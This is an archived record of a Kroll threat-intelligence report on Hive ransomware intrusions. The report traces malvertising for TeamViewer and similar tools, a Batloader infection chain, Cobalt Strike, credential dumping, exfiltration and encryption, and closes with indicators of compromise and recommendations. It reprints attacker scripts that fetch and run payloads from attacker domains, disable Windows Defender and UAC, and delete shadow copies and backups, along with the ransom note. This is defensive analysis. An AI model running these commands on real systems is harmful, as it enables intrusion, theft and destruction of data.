{
    "id": "625f436c-c0a1-410f-b9fc-b99f7a30479c",
    "created_at": "2023-05-06T02:09:29.006007Z",
    "updated_at": "2025-03-27T02:09:29.652668Z",
    "deleted_at": null,
    "sha1_hash": "65dd846f458ebe937a4275d3abbd5869613fcf7f",
    "title": "2023-02-02 - Hive Ransomware Technical Analysis and Initial Access Discovery",
    "authors": "",
    "file_creation_date": "2023-05-05T02:00:49Z",
    "file_modification_date": "2023-05-05T02:00:49Z",
    "file_size": 2118694,
    "plain_text": "# Hive Ransomware Analysis | Kroll\n\n**[kroll.com/en/insights/publications/cyber/hive-ransomware-technical-analysis-initial-access-discovery](https://www.kroll.com/en/insights/publications/cyber/hive-ransomware-technical-analysis-initial-access-discovery)**\n\n### Cyber Risk\n\nThu, Feb 2, 2023\n\n## Hive Ransomware Technical Analysis and Initial Access Discovery\n\nStephen Green\n\n\n-----\n\nElio Biasiotto\n\n_Hive has been seized by law enforcement, but we're likely to still see these initial access_\n_methods and tactics used across other threat actor groups._\n\nKroll has observed an increase in Hive ransomware incidents across a wide range of\nindustry verticals. A new trend of initial infection vector (IIV) has been identified by Kroll\nanalysts that may relate to the increase of activity and the varying nature of targets. Across a\nnumber of incidents, the IIV was attributed to IT administrators looking to download common\nsoftwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided\nwith advertisements for these tools at the top of their search results. We recently [reported on](https://www.kroll.com/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer)\nthis trend, where threat actors were abusing Google Ads to deploy malware via downloads.\n\nWhen these IT administrators downloaded the desired “tools” from the malicious ad links,\nBatloader was also unknowingly delivered. Batloader is an initial access malware utilized to\ndeliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor’s foothold\nwithin a network. Cobalt Strike can then be installed to maintain command and control. Once\nthe threat actor has acquired credentials and identified sensitive files for exfiltration, they are\n[able to utilize common exfiltration tools such as WinSCP and Rclone to extract a victim’s](https://www.kroll.com/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone)\n\n\n-----\n\ndata. The ransomware binary is then executed with a specific identifiable encryption key and\nthis is used to create the ransom note named “HOW_TO_DECRYPT.txt” and appends a\nspecific file extension related to a dropped key file within the root of C:\\.\n\nA login is provided for the victim to access the Hive “Sales Department” onion site, and if\ndemands are not met, data is then shared on their “Hive Leak” onion site.\n\n## Timeline of Incident\n\n### Initial Exploit\n\nIn a recent case, after the IT administrator searched for TeamViewer and clicked the\nadvertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?\nhttps://www.teamviewer[.]com/en/customer-support. This link then redirected to\nhttps://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain\nand identified a large number of similar typosquatted domains for a wide range of common\nsoftware hosted on the same IP address and hosted by regprivate[.]ru.  Most of these\ndomains were inactive, which suggests that the threat actors are continually creating new\nadvertisements. An installation file is then provided from\nhttps://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader\n.msi file. The file sharing provider 4sync has been identified across separate Batloader\nincidents and appears to serve the Batloader .msi download.\n```\nzoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewercloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com,\nteamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com,\nprogrammbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com,\ngimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com,\nevernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com,\nanyclouddesk[.]com, adubecorp[.]com\n\n```\nFigure 1: Example of Typosquatted domains associated with teamviewclouds[.]com\n\n\n-----\n\n[The installer itself installed novaPDF by Softland rather than TeamViewer and dropped](https://www.novapdf.com/)\nPowerShell scripts “scrED95.ps1” and “pssEDC6.ps1”. “pssEDC6.ps1” is a conversion script\nthat creates the initial downloader script “scrED95.ps1”. This script downloads the initial\nBatloader script “update.bat” and sets the working directory to the user’s appdata local\ndirectory. The scripts are executed by PowerShell as shown in figure 2.\n```\npowershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File\n\"C:\\Users\\user\\AppData\\Local\\Temp\\pssEDC6.ps1\" -propFile\n\"C:\\Users\\user\\AppData\\Local\\Temp\\msiED94.txt\" -scriptFile\n\"C:\\Users\\user\\AppData\\Local\\Temp\\scrED95.ps1\" -scriptArgsFile\n\"C:\\Users\\user\\AppData\\Local\\Temp\\scrED96.txt\" -propSep \" :<->: \" -testPrefix\n\"_testValue.\"\n\n```\nFigure 2: PowerShell command to create initial downloader\n```\nSet-Location \"$Env:USERPROFILE\\AppData\\Roaming\"\n\nInvoke-RestMethod -Uri\nhttps://cloudupdatesss[.]com/g5i0nq/index/e6a5614c379561c94004c531781ee1c5/?\nservername=msi -OutFile update.bat\n\nStart-Process -WindowStyle hidden -FilePath\n\"$Env:USERPROFILE\\AppData\\Roaming\\update.bat\n\n```\nFigure 3: scrED95.ps1\n\nMITRE ATT&CK: T1583.001: Acquire Domain Names\n\nMITRE ATT&CK: T1608.004: Stage Capabilities - Drive-by Target\nMITRE ATT&CK: T1588: Obtain Capabilities\n\nMITRE ATT&CK: T1189: Drive-by Compromise\n\n### Toolkit Deployment and Escalation\n\nTo maintain persistence and to gain increased privileges, Hive actors leverage Batloader to\ndownload Ursnif and Vidar, but also attempt to gain the highest privileges possible to install\nthe malware. The initial Batloader script downloads “requestadmin.bat” and attempts to\n[execute it with evaluated privileges by nircmd.exe.](https://www.nirsoft.net/utils/nircmd.html)\n```\npowershell Invoke-WebRequest\nhttps://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?\nservername=msi -OutFile requestadmin.bat\n\npowershell Invoke-WebRequest\nhttps://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?\nservername=msi -OutFile nircmd.exe\n\ncmd /c nircmd elevatecmd exec hide \"requestadmin.bat\"\n\nping 127.0.0.1 -n 20\n\n```\nFigure 4: update.bat\n\n\n-----\n\nThe requestadmin.bat then attempts to download further scripts named runanddelete.bat\nand “scripttodo.ps1”. The script itself also attempts to whitelist specific paths from Windows\n[Defender before downloading Nsudo.exe. Nsudo provides capabilities to execute binaries](https://nsudo.m2team.org/en-us/)\nwith elevated privileges, which are then used to edit the system registry to disable the user\naccess control prompt and to disable task manager and other registry tools. The Windows\npower system settings tool Powercfg is then executed to disable sleep, which will allow the\nthreat actor to maintain persistent access.\n\n\n-----\n\n```\nset pop %systemroot%\n\ncd %APPDATA%\n\npowershell Invoke-WebRequest\nhttps://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?\nservername=msi -OutFile runanddelete.bat\n\ncd %APPDATA%\n\npowershell Invoke-WebRequest\nhttps://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?\nservername=msi -OutFile scripttodo.ps1\n\nstart /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"&\n'./scripttodo.ps1'\"\n\ndel nircmd.exe\n\ncmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming'\n\ncmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming\\'\n\n--- <snip> --\npowershell Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/BypassTamper-Protection/main/NSudo.exe -outfile Nsudo.exe\n\nset pop=%systemroot%\n\nNSudo -U:T -ShowWindowMode:Hide reg add\n\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v\n\"ConsentPromptBehaviorAdmin\" /t REG_DWORD /d \"0\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\nDefender\\UX Configuration\" /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\"\n/t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableCMD\" /t\nREG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v\n\"DisableRegistryTools\" /t REG_DWORD /d \"1\" /f\n\nNSudo -U:T -ShowWindowMode:Hide reg add\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoRun\" /t\nREG_DWORD /d \"1\" /f\n\npowercfg.exe /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 1800\n\npowercfg -change -standby-timeout-dc 3000\n\npowercfg -change -standby-timeout-ac 3000\n\nstart /b \"\" cmd /c del \"%~f0\"&exit /b\n\n```\nFigure 5: requestadmin.bat\n\nThe script “runanddelete.bat” appears to be a modified open-source script named “getadmin.bat”. This script attempts to spawn the user access control prompt to gain the\nincreased privileges to then spawn an Administrator shell, via a created file named\n\n\n-----\n\ngetadmin.vbs . Once increased privileges are achieved, it then attempts to run Ursnif\n(d2ef5.exe). Ursnif can be used to extract system information and seek to steal user\ncredentials.\n```\n@echo off\n\ntitle Installing Packages\n\n:: BatchGotAdmin\n\n::------------------------------------\nREM --> Check for permissions\n\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\n\nREM --> If error flag set, we do not have admin.\n\nif '%errorlevel%' NEQ '0' (\n\n  echo Requesting administrative privileges...\n\n  goto UACPrompt\n\n) else ( goto gotAdmin )\n\n:UACPrompt\n\n  echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\n\n  set params = %*:\"=\"\n\n  echo UAC.ShellExecute \"cmd.exe\", \"/c %~s0 %params%\", \"\", \"runas\", 0 >>\n\"%temp%\\getadmin.vbs\"\n\n  \"%temp%\\getadmin.vbs\"\n\n  del \"%temp%\\getadmin.vbs\"\n\n  exit /B\n\n:gotAdmin\n\necho Installing Necessary Packages.....Please Wait.....\n\ncd %APPDATA%\n\nstart /b d2ef5.exe\n\n\n```\nFigure 6: runanddelete.bat\n\n[The script “scripttodo.ps1” initially installs GNU Privacy Guard for Windows (“Gpg4Win”),](https://www.gpg4win.org/)\nwhich is a file encryption software. Vidar binaries are then downloaded and decrypted by\nGpg4Win along with a further attempt to download Nsudo.exe. The Vidar binaries are then\nexecuted, likely in an attempt to further gather system information and to gather credentials.\nThe script also creates exclusions in the registry to prevent Windows Defender alerting on\nexecution.\n\n\n-----\n\n```\nparam\n\n     (\n\n          [Parameter(Mandatory)]\n\n          [ValidateNotNullOrEmpty()]\n\n          [string]$DownloadFolderPath,\n\n          [Parameter()]\n\n          [ValidateNotNullOrEmpty()]\n\n          [string]$DownloadUrl = 'http://files.gpg4win[.]org/gpg4win-2.2.5.exe'\n\n     )\n\n--- <snip> --\nif ($Condition_All )\n\n{\n\n  $URL =\n\"https://cloudupdatesss[.]com/t1mw0r/index/d2ef590c0310838490561a205469713d/?\nservername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" +\n$UserPCname\n\n  $URL1 =\n\"https://cloudupdatesss[.]com/t1mw0r/index/i850c923db452d4556a2c46125e7b6f2/?\nservername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" +\n$UserPCname\n\n  $URL2 =\n\"https://cloudupdatesss[.]com/t1mw0r/index/b5e6ec2584da24e2401f9bc14a08dedf/?\nservername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" +\n$UserPCname\n\n     Invoke-WebRequest $URL -outfile p9d2s.exe.gpg\n\n     Invoke-WebRequest $URL1 -outfile p9d2.bat\n\n     Invoke-WebRequest $URL2 -outfile ata.exe.gpg\n\n}\n\n--- <snip> --\nRemove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FEB9D127C57AFE}\" -Recurse\n\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\n$uri = 'https://raw.githubusercontent.com/adbertram/Random-PowerShellWork/master/Security/GnuPg.psm1'\n\n$moduleFolderPath = 'C:\\Program Files\\WindowsPowerShell\\Modules\\GnuPg'\n\n$null = New-Item -Path $moduleFolderPath -Type Directory\n\nInvoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath -ChildPath\n'GnuPg.psm1')\n\n$env:APPDATA\n\nInstall-GnuPG -DownloadFolderPath $env:APPDATA\n\necho \"START\"\n\nAdd-MpPreference -ExclusionExtension “exe”\n\nAdd-MpPreference -ExclusionExtension “dll”\n\nRemove-Encryption -FolderPath $env:APPDATA -Password '105b'\n\nInvoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper\n```\n\n-----\n\n```\nProtection/main/NSudo.exe outfile Nsudo.exe\n\n.\\p9d2s.exe\n\n.\\ata.exe\n\n.\\p9d2.bat\n\n```\nFigure 7: scripttodo.ps1 snippets\n\nMITRE ATT&CK: T1059: Command and Scripting Interpreter\n\nMITRE ATT&CK: T1064: Scripting\n\nMITRE ATT&CK: T1548.002: Bypass User Account Control\n\nMITRE ATT&CK: T1222: File and Directory Permissions Modification\n\nMITRE ATT&CK: T1583.001: Acquire Domain Names\n\nMITRE ATT&CK: T1027: Obfuscated Files\nMITRE ATT&CK: T1056: Input Capture\n\nThe post-exploitation tool Cobalt Strike is often leveraged to provide command and control,\nutilizing both HTTP and SMB beacons to move laterally and report back to the threat actor’s\ninfrastructure.\n```\n{\n\n \"BeaconType\": [\n\n  \"HTTP\"\n\n ],\n\n \"Port\": 80,\n\n \"SleepTime\": 45000,\n\n \"MaxGetSize\": 1403644,\n\n \"Jitter\": 37,\n\n \"C2Server\": \"softeruplive[.]com,/jquery-3.3.1.min.js\",\n\n \"HttpPostUri\": \"/jquery-3.3.2.min.js\",\n\n \"Malleable_C2_Instructions\": [\n\n  \"Remove 1522 bytes from the end\",\n\n  \"Remove 84 bytes from the beginning\",\n\n  \"Remove 3931 bytes from the beginning\",\n\n  \"Base64 URL-safe decode\",\n\n  \"XOR mask w/ random key\"\n\n ],\n\n \"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"HttpGet_Verb\": \"GET\",\n\n \"HttpPost_Verb\": \"POST\",\n\n--- <SNIP> --\n```\nFigure 8: Cobalt Strike HTTP beacon\n\nMITRE ATT&CK: T1001: Data Obfuscation\n\nMITRE ATT&CK: T1573.001: Encrypted Channel: Symmetric Cryptography\n\n\n-----\n\nIf required, the threat actors have also used minidump and ProcDump to dump the LSASS\nprocess. This is likely an attempt to dump NTLM credential hashes for password cracking, or\nfor pass the hash techniques. PowerSploit has also been identified with attempts to run\n“Invoke-Kerberoast” to gain Kerberos ticket hashes for service accounts. This would likely\nprovide the threat actor with increased privileges or access if successful.\n\nMITRE ATT&CK: T1003.001: Credential Dumping – LSASS Memory\n\nMITRE ATT&CK: T1558.003: Kerberoasting\n\nMITRE ATT&CK: T1550: Use Alternate Authentication Material\n\nCommon remote access software such as Splashtop can be installed via Cobalt Strike to\nprovide a persistent, seemingly legitimate access to the network. This also allows the threat\nactor to conduct hands-on operations. Remote Desktop Protocol (RDP) is used with\nlegitimate accounts to navigate across the network.\n\nMITRE ATT&CK: T1219: Remote Access Software\n\nMITRE ATT&CK: T1021: Remote Services\n\n### Internal Scouting\n\nOnce the threat actor gains a foothold within the network, Kroll has observed the use of tools\nsuch as [ADFind to identify accounts and servers. Other common tools such as nslookup and](https://attack.mitre.org/software/S0552/)\nwhoami have also been used to gain initial system information.\n\nThe Exchange PowerShell module Get-DomainController has also been identified when\nleveraging Cobalt Strike to execute commands. This module provides information on the\ndomain controller for the local domain.\n```\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEA\nG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOg\nA3ADUANwAyAC8AJwApADsAIABHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA\n\n---Decoded Base64 string--\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:7572/'); GetDomainController\n\n```\nFigure 9: Example of Cobalt Strike commands\n\nMITRE ATT&CK: T1482: Domain Trust Discovery\n\nMITRE ATT&CK: T1087: Account Discovery\n\nMITRE ATT&CK: T1016: System Network Configuration Discovery\n\n### Mission Execution\n\n\n-----\n\nThe threat actors look to identify sensitive files for exfiltration before encrypting devices by\nusing tools such as Rclone to automate data extraction to cloud storage. Kroll has observed\nthat threat actors have searched for files using PowerShell and manual traversal across files.\n\nMITRE ATT&CK: T1005: Data from Local System\n\nMITRE ATT&CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage\n\nMITRE ATT&CK: T1020: Automate Exfiltration\n\nTo push the ransomware binary across the network, the sysinternals tool PsExec has been\nleveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself\nappears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and\npassword \".\\windows_x64_encrypt.exe -u login:password”. There are other options available\nfor file encryption including:\n\n-local-only: Encrypt only local files.\n-no-discovery: Do not look for network shares.\n-explicit-only: Encrypt specific directories.\n\nBy default, the binary prevents recovery by deleting volume shadow copies “vssadmin.exe\ndelete shadows /all /quiet” and deletes system backups with “wbadmin.exe delete\nsystemstatebackup” and “wbadmin.exe delete catalog-quiet” before preventing recovery from\nboot with “\\bcdedit.exe /set {default} recoveryenabled No” and “bcdedit.exe\" /set {default}\n[bootstatuspolicy ignoreallfailures”. The binary encrypts files, except for “.lnk” files and](https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/)\nbinaries within “C:\\windows”, before generating two key files in the root of C:\\. The key files\nalso determine the extension string added to the encrypted files along with a base64\nencoded pointer.\n\n\n-----\n\n```\nYour network has been breached and all data were encrypted.          \n\nPersonal data, financial reports and important documents are ready to disclose.\n\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at  \n\nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/    \n\nyou will need to purchase our decryption software. \n\nPlease contact our sales department at: \n\n  http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/   \n\n   Login: <redacted>\n\n   Password: <redacted>\n\nTo get an access to .onion websites download and install Tor Browser at:   \n\n  https://www.torproject[.]org/ (Tor Browser is not related to us)\n\nFollow the guidelines below to avoid losing your data: \n\n - Do not modify, rename or delete *.key files. Your data will be       \n\n  undecryptable.                               \n\n - Do not modify or rename encrypted files. You will lose them.        \n\n - Do not report to the Police, FBI, etc. They don't care about your business.\n\n  They simply won't allow you to pay. As a result you will lose everything. \n\n - Do not hire a recovery company. They can't decrypt without the key.    \n\n  They also don't care about your business. They believe that they are    \n\n  good negotiators, but it is not. They usually fail. So speak for yourself. \n\n - Do not reject to purchase. Exfiltrated files will be publicly disclosed.\n\n```\nFigure 10: HOW_TO_DECRYPT.txt\n\nMITRE ATT&CK: T1570 : Lateral Tool Transfer\n\nMITRE ATT&CK: T1490 : Inhibit System Recovery\n\nMITRE ATT&CK: T1486 : Data Encrypted for Impact\n\nOnce data has been extracted and encrypted, victims are directed to their customer page to\nnegotiate the ransom fee. If a fee is not agreed, then victims could be placed onto their\nshaming site: “HiveLeaks.”\n\n\n-----\n\nFigure 11: HiveLeaks Shaming Site\n\n## Mitre ATT&CK Mapping\n\n**Tactic** **Technique** **Procedure**\n\nTA0042 T1566.002 Acquire Domain Names\n\nT1588.001 Obtain Capabilities - Malware\n\nT1588.002 Obtain Capabilities - Tool\n\nT1608.004 Stage Capabilities - Drive-by\nTarget\n\nTA0001 T1189 Drive-by Compromise\n\nTA0002 T1059 Command and Scripting Interpreter\n\nT1064 Scripting\n\nT1204 User Execution\n\n\n-----\n\nT1072 Software Deployment Tools\n\nTA0003 T1078 Valid Accounts\n\nT1543.003 Create or Modify System Process Windows Service\n\nTA0004 T1548.002 Bypass User Account Control\n\nT1134 Access Token Manipulation\n\nTA0005 T1548.002 Bypass User Account Control\n\nT1222 File and Directory Permissions\nModification\n\nT1070 Indicator Removal\n\nT1027 Obfuscated Files\n\nT1550 Use Alternate Authentication\nMaterial\n\nT1078 Valid Accounts\n\nTA0006 T1056 Input Capture\n\nT1003.001 Credential Dumping - LSASS\nMemory\n\nT1558.003 Steal or Forge Kerberos Tickets Kerberoasting\n\nTA0007 T1482 Domain Trust Discovery\n\nT1087 Account Discovery\n\n\n-----\n\nT1016 System Network Configuration\nDiscovery\n\nTA0008 T1021 Remote services\n\nT1570 Lateral Tool Transfer\n\nTA0009 T1005 Data from Local System\n\nTA0011 T1219 Remote Access Software\n\nT1573.001 Encrypted Channel: Symmetric\nCryptography\n\nT1001 Data Obfuscation\n\nTA0010 T1567.002 Exfiltration Over Web Service:\nExfiltration to Cloud Storage\n\nT1020 Automate Exfiltration\n\nTA0040 T1490 Inhibit System Recovery\n\nT1486 Data Encrypted for Impact\n\n## Recommendations\n\nKroll has identified recommendations relating to this alert:\n\n**Recommendation** **Observation**\n\n\nMonitor PowerShell execution\n\nEnsure PowerShell is logged,\nand create detections for\nencoded script execution.\n\n\nThe threat actor utilized Cobalt Strike. Monitoring\nPowerShell execution can identify malicious activity\nassociated with Cobalt Strike.\n\n\n-----\n\nEnable credential guard\n\n[Windows Credential Guard can](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)\nprovide protection against\npassword extraction and other\nauthentication attacks.\n\nAudit user, administrator and\nservice accounts\n\nEnsure accounts have the\ncorrect access and privileges.\nImplement the principle of least\nprivilege.\n\nImplement multi-factor\nauthentication\n\nMulti-factor authentication can\nrestrict access to sensitive areas\nand can prevent lateral\nmovement.\n\nReview backup strategies\n\nEnsure multiple backups are\ntaken and at least one backup is\nisolated from the network.\n\n\nThe threat actor dumped LSASS and conducted\nKerberos attacks. Credential guard can offer some\nprotection against these attacks.\n\nThe threat actor is often able to install tools on user\nendpoints. Limiting the privileges of users can prevent\na threat actor from installing malicious software.\n\nEnabling multi-factor authentication can prevent a\nthreat actor from moving laterally and accessing\nsensitive data.\n\nAs a ransomware actor’s main aim is to disrupt\nbusiness, ensuring a viable backup and recovery\nstrategy is in place can allow a business to recover\nquickly.\n\n\nReview remote access tools Threat actors leverage legitimate remote access tools\nto maintain persistence. Ensure remote access is\nmonitored and that only approved remote access tools\nexist in the environment.\n\n## Indicators of Compromise\n\nThe following files and hashes have been identified for the incident:\n\n**File Name** **Comment** **MD5 Hash Value**\n\nInstallerV36 (244).msi Batloader MSI 66a0bfcb41071d971f6003de9c2d2840\n\nScripttodo.ps1 Batloader Script ab60761a7016b2b2b883e3a15ef4fecc\n\n\n-----\n\n**File Name** **Comment** **MD5 Hash Value**\n\nRequestadmin.bat Batloader Script 10fcffe4ad2cb37d6dc351ff975b0058\n\nRunanddelete.bat Batloader Script 5cb9d80f82f674b065c3d80816a370c4\n\nUpdate.bat Batloader Script bcf4f2d188a9b855a5e198ad8fbff500\n\n\nProcdump64.exe ProcDump64 used\nto dump LSASS\n\n\n170637b901dc67cda3d905a714096a7f\n\n\nFind.exe Renamed ADfind df5ce1159ef2e257df92e1825d786d87\n\n\nwindows_x64_encrypt.exe Ransomware\nBinary\n\n\n8fba0d57696ccf672ddcea4ba4d0e885\n\n\ngpg4win-2.2.5.exe GNU Privacy Guard 67a4f35cae2896e3922f6f4ab5966e2b\n\nf827.exe Syncro Installer 58f8600ee94571beff3224f75601f0fa\n\nThe following external IP addresses were observed during the incident:\n\n**IP Address** **Comment**\n\n46.30.42[.]56 caroseyama[.]xyz\n\n194.67.119[.]190 cloudupdatesss[.]com\n\n45.8.158[.]104 http://45.8.158[.]104/uploaded\n\n37.140.192[.]70 teamviewclouds[.]com\n\n## Stay Ahead with Kroll\n\n### Cyber Risk\n\n\n-----\n\nIncident response, digital forensics, breach notification, managed detection services,\npenetration testing, cyber assessments and advisory.\n\n### 24x7 Incident Response\n\nEnlist experienced responders to handle the entire security incident lifecycle.\n\n### Computer Forensics\n\nKroll's computer forensics experts ensure that no digital evidence is overlooked and assist at\nany stage of an investigation or litigation, regardless of the number or location of data\nsources.\n\n### Cyber Risk Retainer\n\nKroll delivers more than a typical incident response retainer—secure a true cyber risk\nretainer with elite digital forensics and incident response capabilities and maximum flexibility\nfor proactive and notification services.\n\n### Ransomware Preparedness Assessment\n\nKroll’s ransomware preparedness assessment helps your organization avoid ransomware\nattacks by examining 14 crucial security areas and attack vectors.\n\n### Data Recovery and Forensic Analysis\n\nKroll's expertise establishes whether data was compromised and to what extent. We uncover\nactionable information, leaving you better prepared to manage a future incident.\n\n### Business Email Compromise (BEC) Response and Investigation\n\nIn a business email compromise (BEC) attack, fast and decisive response can make a\ntremendous difference in limiting financial, reputational and litigation risk. With decades of\nexperience investigating BEC scams across a variety of platforms and proprietary forensic\ntools, Kroll is your ultimate BEC response partner.\n\n### Incident Remediation and Recovery Services\n\nCyber incident remediation and recovery services are part of Kroll’s Complete Response\ncapabilities, expediting system recovery and minimizing business disruption.\n\nReturn to top\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-02 - Hive Ransomware Technical Analysis and Initial Access Discovery.pdf"
    ],
    "report_names": [
        "2023-02-02 - Hive Ransomware Technical Analysis and Initial Access Discovery.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338969,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1683252049,
    "ts_modification_date": 1683252049,
    "files": {
        "pdf": "https://archive.orkl.eu/65dd846f458ebe937a4275d3abbd5869613fcf7f.pdf",
        "text": "https://archive.orkl.eu/65dd846f458ebe937a4275d3abbd5869613fcf7f.txt",
        "img": "https://archive.orkl.eu/65dd846f458ebe937a4275d3abbd5869613fcf7f.jpg"
    }
}